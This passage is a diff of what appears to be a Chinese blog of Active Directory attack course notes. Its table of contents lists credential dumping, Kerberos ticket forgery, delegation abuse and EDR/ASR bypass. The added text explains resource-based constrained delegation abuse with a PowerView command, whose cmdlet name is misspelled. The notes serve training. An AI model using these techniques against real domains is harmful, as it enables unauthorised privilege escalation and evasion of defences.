href="#sid%E6%98%AF%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%EF%BC%8C%E6%97%A0%E6%B3%95%E5%87%BA%E7%8E%B0%E4%BF%A9%E7%9B%B8%E5%90%8C%E7%9A%84"><span class="toc-number">2.4.</span> <span class="toc-text">sid是唯一标识，无法出现俩相同的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%80%E4%B8%AA%E5%9F%9F%E6%94%B6%E5%88%B0%E4%BA%86%E6%94%BB%E5%87%BB%EF%BC%8C%E6%95%B4%E4%B8%AA%E5%9F%9F%E6%9E%97%E6%97%A9%E6%99%9A%E9%83%BD%E4%BC%9AG%EF%BC%8C%EF%BC%88%E8%BF%99%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%B0%86%E4%BC%9A%E5%9C%A8-19-%E5%92%8C-20-%E8%8A%82%E8%AF%BE%E4%B8%AD%E5%AD%A6%E5%88%B0%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E4%BA%BA%E5%91%98"><span class="toc-number">2.6.</span> <span class="toc-text">4.枚举域管理员组人员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E6%89%80%E5%B1%9E%E7%BB%84"><span class="toc-number">2.7.</span> <span class="toc-text">5.通过用户名枚举用户所属组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%97%E5%87%BA%E6%9C%AC%E5%9C%B0-%E7%BB%84-%E6%88%96-%E7%BB%84%E6%88%90%E5%91%98"><span class="toc-number">2.8.</span> <span class="toc-text">6.列出本地 组 或 组成员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9E%9A%E4%B8%BE-smbshare"><span class="toc-number">2.9.</span> <span class="toc-text">7.枚举 smbshare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-bloodhound%E9%81%9B%E7%8B%97"><span class="toc-number">2.10.</span> <span class="toc-text">8.bloodhound遛狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-SOAPHound"><span class="toc-number">2.11.</span> <span class="toc-text">9.SOAPHound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%9F%9F%E4%BC%9A%E8%AF%9D%EF%BC%88session%EF%BC%89%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.12.</span> <span class="toc-text">10.域会话（session）枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E7%94%A8%E6%88%B7%E8%A2%AB%E9%85%8D%E7%BD%AE%E4%B8%BA%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98-%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.13.</span> <span class="toc-text">11.用户被配置为本地管理员 枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-powershell"><span class="toc-number">3.</span> <span class="toc-text">03 powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-amsi"><span class="toc-number">3.1.</span> <span class="toc-text">bypass amsi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.</span> <span class="toc-text">加载模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%A8%A1%E5%9D%97%E4%B8%AD%E5%8F%AF%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">列出模块中可用的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.4.</span> <span class="toc-text">powershell 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.5.</span> <span class="toc-text">powershell 语言模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#applocker"><span class="toc-number">3.5.1.</span> <span class="toc-text">applocker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E5%8F%97%E9%99%90"><span class="toc-number">3.6.</span> <span class="toc-text">powershell执行脚本受限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OPSEC"><span class="toc-number">4.</span> <span class="toc-text">OPSEC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.1.</span> <span class="toc-text">域票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.</span> <span class="toc-text">域用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-GPO-OU"><span class="toc-number">5.</span> <span class="toc-text">04 GPO,OU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO"><span class="toc-number">5.1.</span> <span class="toc-text">GPO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OU"><span class="toc-number">5.2.</span> <span class="toc-text">OU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E9%99%90%E7%BB%84"><span class="toc-number">5.3.</span> <span class="toc-text">受限组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO%E6%BB%A5%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">GPO滥用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-Domian-Trusts"><span class="toc-number">6.</span> <span class="toc-text">05 Domian Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.1.</span> <span class="toc-text">外部信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forest-Trusts"><span class="toc-number">6.2.</span> <span class="toc-text">Forest Trusts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E5%90%8D%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.3.</span> <span class="toc-text">枚举域名信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-Forest"><span class="toc-number">6.4.</span> <span class="toc-text">枚举 Forest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%9E%97%E4%B8%AD%E7%9A%84%E5%9F%9F"><span class="toc-number">6.5.</span> <span class="toc-text">获取指定域林中的域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%9E%97%E4%B8%AD%E7%9A%84%E5%85%A8%E5%B1%80%E7%BC%96%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E6%9E%9A%E4%B8%BE%E4%BD%9C%E4%B8%BA%E5%85%A8%E5%B1%80%E7%9B%AE%E5%BD%95%E7%9A%84DC%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%89"><span class="toc-number">6.6.</span> <span class="toc-text">列出林中的全局编录服务器（枚举作为全局目录的DC控制器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E6%9E%97%E4%B9%8B%E9%97%B4%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.7.</span> <span class="toc-text">枚举域林之间信任</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">06 权限提升(Privilege Escalation)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%BA%E9%99%B7%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">7.1.</span> <span class="toc-text">1.缺陷服务枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AC%E8%BA%AB%E5%B0%B1%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E9%AB%98%E6%9D%83%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.2.</span> <span class="toc-text">2.本身就易受攻击的高权服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-NTLM-KRB%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.</span> <span class="toc-text">3.NTLM&#x2F;KRB中继攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">07 横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E7%9B%B8%E5%85%B3%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="toc-number">9.</span> <span class="toc-text">08 相关敏感凭据提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">9.1.</span> <span class="toc-text">mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC%E4%B8%ADdump%E6%89%80%E6%9C%89%E5%9F%9F%E5%87%AD%E6%8D%AE"><span class="toc-number">9.1.1.</span> <span class="toc-text">DC中dump所有域凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dump%E5%87%AD%E6%8D%AE-dump-credentials"><span class="toc-number">9.1.2.</span> <span class="toc-text">dump凭据 dump credentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-pth"><span class="toc-number">9.1.3.</span> <span class="toc-text">哈希传递(pth)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCSync"><span class="toc-number">9.1.4.</span> <span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PS%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95"><span class="toc-number">9.2.</span> <span class="toc-text">PS历史命令记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">9.2.1.</span> <span class="toc-text">票据利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-kerberos"><span class="toc-number">10.</span> <span class="toc-text">09 kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PAC"><span class="toc-number">10.1.</span> <span class="toc-text">1.PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Golden-Ticket"><span class="toc-number">10.2.</span> <span class="toc-text">2.Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%87%91%E7%A5%A8%EF%BC%9A"><span class="toc-number">10.2.1.</span> <span class="toc-text">利用金票：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-sliver-Ticket"><span class="toc-number">10.3.</span> <span class="toc-text">3.sliver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%93%B6%E7%A5%A8"><span class="toc-number">10.3.1.</span> <span class="toc-text">1.利用银票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Diamond-Ticket"><span class="toc-number">10.4.</span> <span class="toc-text">4.Diamond Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%92%BB%E7%9F%B3%E7%A5%A8"><span class="toc-number">10.4.1.</span> <span class="toc-text">1.利用钻石票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Skeleton-key"><span class="toc-number">10.5.</span> <span class="toc-text">5.Skeleton key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="toc-number">10.5.1.</span> <span class="toc-text">1.注入万能钥匙</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-DSRM"><span class="toc-number">10.6.</span> <span class="toc-text">6.DSRM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96DSRM%E5%87%AD%E6%8D%AE"><span class="toc-number">10.6.1.</span> <span class="toc-text">1.获取DSRM凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8DSRM%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7"><span class="toc-number">10.6.2.</span> <span class="toc-text">2.利用DSRM管理员账户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Custom-SSP"><span class="toc-number">10.7.</span> <span class="toc-text">7.Custom SSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">10.7.1.</span> <span class="toc-text">1.利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-kerberoasting"><span class="toc-number">10.8.</span> <span class="toc-text">8.kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SPN"><span class="toc-number">10.8.1.</span> <span class="toc-text">1.SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">10.8.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-AS-REProast"><span class="toc-number">10.8.2.</span> <span class="toc-text">2.AS-REProast</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">10.8.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Kerberos-Delegation-%EF%BC%88%E5%A7%94%E6%B4%BE%EF%BC%89"><span class="toc-number">10.9.</span> <span class="toc-text">9.Kerberos Delegation （委派）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-Delegation"><span class="toc-number">10.9.1.</span> <span class="toc-text">1.无约束委派 Unconstrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE"><span class="toc-number">10.9.1.1.</span> <span class="toc-text">1.枚举</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-number">10.9.1.2.</span> <span class="toc-text">2.利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Constrained-Delegation"><span class="toc-number">10.9.2.</span> <span class="toc-text">2.约束委派 Constrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U2Self"><span class="toc-number">10.9.2.1.</span> <span class="toc-text">S4U2Self</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U4Proxy"><span class="toc-number">10.9.2.2.</span> <span class="toc-text">S4U4Proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E5%90%AF%E7%94%A8%E4%BA%86%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E7%94%A8%E6%88%B7%E6%88%96%E6%9C%BA%E5%99%A8"><span class="toc-number">10.9.2.3.</span> <span class="toc-text">1.寻找启用了约束委派的用户或机器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-S4U2Self-S4U2Proxy-%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.4.</span> <span class="toc-text">2.利用 S4U2Self + S4U2Proxy 访问服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8D%E7%A7%B0%E4%B8%8D%E5%8F%98-%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9S4U2proxy%E8%AF%B7%E6%B1%82%E5%9B%9E%E6%9D%A5%E7%9A%84%E7%A5%A8%E6%8D%AE%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%A5%E8%AE%BF%E9%97%AE%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.5.</span> <span class="toc-text">3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8-S4U2Self-%E4%BC%AA%E9%80%A0%E9%AB%98%E6%9D%83%E7%94%A8%E6%88%B7%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7ms-AllowedToDelegateTo%E5%B1%9E%E6%80%A7%E6%8C%87%E5%90%91%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%BA%E5%99%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.6.</span> <span class="toc-text">4. 利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-number">10.9.3.</span> <span class="toc-text">3.基于资源的约束委派 RBCD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">10.9.3.1.</span> <span class="toc-text">1.利用点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE-msDS-AllowedToActOnBehalfOfOtherIdentity-%E5%AD%97%E6%AE%B5"><span class="toc-number">10.9.3.2.</span> <span class="toc-text">2.配置 msDS-AllowedToActOnBehalfOfOtherIdentity 字段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%A8%E5%9F%9F-Across-Trusts"><span class="toc-number">10.10.</span> <span class="toc-text">10.跨域 Across Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SID-history"><span class="toc-number">10.10.1.</span> <span class="toc-text">1.SID history</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8F%90%E5%8F%96trust-key"><span class="toc-number">10.10.1.1.</span> <span class="toc-text">1.提取trust key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E4%BC%AA%E9%80%A0%E8%B7%A8%E5%9F%9FTGT"><span class="toc-number">10.10.1.2.</span> <span class="toc-text">2.利用信任密钥伪造跨域TGT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%BD%93%E5%89%8D%E5%9F%9Fkrbtgt-key-%E4%BC%AA%E9%80%A0TGT%E5%B9%B6%E6%B3%A8%E5%85%A5-sid-history%EF%BC%88%E7%AD%89%E5%90%8C%E6%9E%84%E9%80%A0%E9%87%91%E7%A5%A8%E6%97%B6%E5%80%99%E9%87%8C%E9%9D%A2%E5%8A%A0%E4%B8%AAsid-history%E5%B1%9E%E6%80%A7%EF%BC%89"><span class="toc-number">10.10.1.3.</span> <span class="toc-text">3.利用当前域krbtgt key 伪造TGT并注入 sid history（等同构造金票时候里面加个sid history属性）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%A3%80%E6%B5%8B%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">10.10.1.4.</span> <span class="toc-text">4.检测点绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3%E7%A5%A8"><span class="toc-number">10.10.1.4.1.</span> <span class="toc-text">钻石票</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%EF%BC%8C%E8%B7%A8%E5%A4%96%E9%83%A8%E4%BF%A1%E4%BB%BB%EF%BC%88%E6%9E%97%EF%BC%89%E5%9F%9F-Across-External-Trust"><span class="toc-number">10.11.</span> <span class="toc-text">11，跨外部信任（林）域 Across External Trust</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%AF%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">10.11.1.</span> <span class="toc-text">1.可利用点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%9A%E4%B8%BE%E8%B5%84%E6%BA%90%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.11.2.</span> <span class="toc-text">2.枚举资源服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-ADCS"><span class="toc-number">11.</span> <span class="toc-text">10 ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%81%E7%A8%8B"><span class="toc-number">11.1.</span> <span class="toc-text">1.流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">11.2.</span> <span class="toc-text">2.利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BEADCS"><span class="toc-number">11.3.</span> <span class="toc-text">3.枚举ADCS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">11.4.</span> <span class="toc-text">4.利用示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-SQL-server-Trust-Abuse"><span class="toc-number">12.</span> <span class="toc-text">11.SQL server Trust Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%98%E5%9C%A8%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">12.1.</span> <span class="toc-text">1.存在利用点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-MDE"><span class="toc-number">13.</span> <span class="toc-text">12.MDE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#minidump"><span class="toc-number">13.1.</span> <span class="toc-text">minidump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BC%A0%E8%BE%93%E8%90%BD%E5%9C%B0"><span class="toc-number">13.2.</span> <span class="toc-text">工具传输落地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E7%A0%B4%E6%A3%80%E6%B5%8B%E9%93%BE"><span class="toc-number">13.3.</span> <span class="toc-text">打破检测链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASR%E7%BB%95%E8%BF%87"><span class="toc-number">13.4.</span> <span class="toc-text">ASR绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E5%81%9A%E4%B8%80%E9%81%8D11-sqlserver%EF%BC%8C%E9%87%87%E7%94%A8%E5%9F%BA%E4%BA%8Eopsec%E7%BB%95%E8%BF%87mde%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">13.5.</span> <span class="toc-text">重新做一遍11.sqlserver，采用基于opsec绕过mde的做法</span></a></li></ol></li></ol>
 </div>
 <script>
     function toggleTOC() {
         const tocContainer = document.getElementById('tocContainer');
-        const icon = document.querySelector('.toc-toggle-icon i');
-        const isHidden = tocContainer.style.display === 'none';
-        tocContainer.style.display = isHidden ? 'block' : 'none';
-        icon.className = isHidden ? 'fa fa-chevron-up' : 'fa fa-chevron-down';
+        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
+        const toggleIcon = document.querySelector('.toc-toggle-icon i');
+        toggleIcon.classList.toggle('fa-angle-down');
+        toggleIcon.classList.toggle('fa-angle-up');
     }
 </script>
 <style>
     .toc-toggle {
         position: relative;
         display: inline-block;
-        padding: 5px;
-        border: 1px solid #ccc;
-        border-radius: 50%;
-        background-color: #f5f5f5;
+        padding: 2% 2% 2%;
+        border: none;
+        border-radius: 100%;
+        background-color: var(--link);
         cursor: pointer;
-        transition: all 0.2s ease;
+        transition: all 0.1s ease;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        /* position: absolute; */
+        top: 0;
+        right: 0;
+        z-index: 10;
     }
 
     .toc-toggle:hover {
-        background-color: #e5e5e5;
+        background-color: var(--selection-bg);
+        transform: scale(1.1);
     }
 
     .toc-toggle-icon {
@@ -326,14 +332,18 @@
     }
 
     .toc-toggle-icon i {
-        font-size: 16px;
-        transition: transform 0.2s ease;
+        display: inline-block;
+        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
     }
 
-    #tocContainer {
+    /* #tocContainer {
         display: block;
         margin-top: 10px;
-    }
+    } */
+    #tocContainer {
+    position: relative;
+    padding-top: 10px; /* 留出按钮位置 */
+}
 </style>
 
 
@@ -385,7 +395,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            32k words 
+            45k words 
           </div>
         </div>
         
@@ -1437,9 +1447,423 @@
 <p>而基于资源的约束委派（RBCD）将委派配置权限给到了服务自身，发起端的 <code>msDs-AllowedToDelegatTo</code> 属性不再是必须的，由服务账户或服务管理员自己配置服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性 ，允许哪些服务对自己发起委派，委派至哪个服务。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派服务账户（svc1） -&gt; s4u2proxy -&gt; 服务账户（msDS-AllowedToActOnBehalfOfOtherIdentity:svc1）</span><br></pre></td></tr></table></figure>
 
-<h5 id="1-利用点"><a href="#1-利用点" class="headerlink" title="1.利用点"></a>1.利用点</h5><p>如果对于一个高价值服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 有写入权限</p>
-<p>魅写完</p>
+<h5 id="1-利用点"><a href="#1-利用点" class="headerlink" title="1.利用点"></a>1.利用点</h5><p>如果对于一个高价值服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 有写入权限，则可以将其变更指向到一个<strong>当前控制住的</strong> <code>有SPN的账户</code> 或 <code>机器账户</code>，然后通过这个被控制的账户发起委派伪造用户即可。</p>
+<p>如果当前没有控制到符合 <code>有SPN的账户</code> 或 <code>机器账户</code> 条件的账户，则可以用当前域用户添加 <code>域机器账户</code> ，通常来说一个账户允许最多添加10个域机器账户，能添加夺少台取决于域的 <code>ms-DS-MachineAccountQuota</code> 属性，而被这个用户加进来的机器账户是onwer权限。</p>
+<h5 id="2-配置-msDS-AllowedToActOnBehalfOfOtherIdentity-字段"><a href="#2-配置-msDS-AllowedToActOnBehalfOfOtherIdentity-字段" class="headerlink" title="2.配置 msDS-AllowedToActOnBehalfOfOtherIdentity 字段"></a>2.配置 msDS-AllowedToActOnBehalfOfOtherIdentity 字段</h5><p>用权限足够的用户修改添加能控制住的机器到目标的约束委派字段（<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>）</p>
+<p>powerview</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomianRBCD</span> <span class="literal">-Identity</span> dcorp<span class="literal">-mgmt</span> <span class="literal">-DelegateFrom</span> <span class="string">&#x27;student1$&#x27;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#弄完之后可以再查看一下</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomianRBCD</span></span><br></pre></td></tr></table></figure>
 
+<p>AD module</p>
